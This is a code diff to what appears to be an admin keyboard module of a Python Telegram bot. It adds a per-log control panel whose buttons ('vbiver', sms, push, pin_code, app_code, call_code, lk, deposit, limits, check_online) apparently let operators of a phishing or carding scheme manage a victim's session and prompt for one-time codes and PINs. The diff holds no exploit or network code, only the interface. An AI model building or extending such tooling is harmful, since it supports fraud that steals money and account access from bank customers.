@@ -542,3 +542,62 @@ class AdminInKeyboards:
         services_country = InlineKeyboardMarkup(inline_keyboard=rows)
 
         return services_country
+    @staticmethod
+    def back(id):
+        return InlineKeyboardMarkup(inline_keyboard=[
+            [
+                InlineKeyboardButton(text=in_keyboard_texts.back, callback_data=f"log_{id}")
+            ]
+        ])
+    @staticmethod
+    def log(_log, link, service, user):
+        return InlineKeyboardMarkup(inline_keyboard=[
+            [
+                InlineKeyboardButton(text=log.success, callback_data=f"success_log_{_log['id']}")
+            ],
+            [
+              InlineKeyboardButton(text=log.status(_log['status']), callback_data=f"status_log_{_log['id']}")
+            ],
+            [
+                InlineKeyboardButton(text=log.vbiver(user['nickname']), callback_data=f"vbiver_log_{link['id']}")
+            ],
+            [
+                InlineKeyboardButton(text=log.online, callback_data=f"check_online_{_log['id']}")
+            ],
+            [
+                InlineKeyboardButton(text=log.custom_error, callback_data=f"custom_error_{_log['id']}"),
+                InlineKeyboardButton(text=log.custom_text, callback_data=f"custom_text_{_log['id']}")
+            ],
+            [
+                InlineKeyboardButton(text=log.push, callback_data=f"push_log_{_log['id']}"),
+                InlineKeyboardButton(text=log.sms, callback_data=f"sms_log_{_log['id']}"),
+                InlineKeyboardButton(text=log.accurate, callback_data=f"accurate_log_{_log['id']}")
+            ],
+            [
+                InlineKeyboardButton(text=log.change, callback_data=f"change_log_{_log['id']}"),
+                InlineKeyboardButton(text=log.deposit, callback_data=f"deposit_log_{_log['id']}"),
+                InlineKeyboardButton(text=log.limits, callback_data=f"limit_log_{_log['id']}")
+            ],
+            [
+                InlineKeyboardButton(text=log.success_hold, callback_data=f"success_hold_log_{_log['id']}"),
+                InlineKeyboardButton(text=log.error_hold, callback_data=f"error_hold_log_{_log['id']}")
+            ],
+            [
+                InlineKeyboardButton(text=log.lk, callback_data=f"lk_log_{_log['id']}"),
+                InlineKeyboardButton(text=log.pin_code, callback_data=f"pin_code_log_{_log['id']}")
+            ],
+            [
+                InlineKeyboardButton(text=log.app_code,callback_data=f"app_code_log_{_log['id']}"),
+                InlineKeyboardButton(text=log.call_code, callback_data=f"call_code_log_{_log['id']}")
+            ],
+            [
+                InlineKeyboardButton(text=log.error_code, callback_data=f"error_code_log_{_log['id']}"),
+                InlineKeyboardButton(text=log.error_push, callback_data=f"error_push_log_{_log['id']}")
+            ],
+            [
+                InlineKeyboardButton(text=log.image, callback_data=f"image_log_{_log['id']}"),
+            ],
+            [
+                InlineKeyboardButton(text=log.decline, callback_data=f"decline_log_{_log['id']}")
+            ]
+        ])
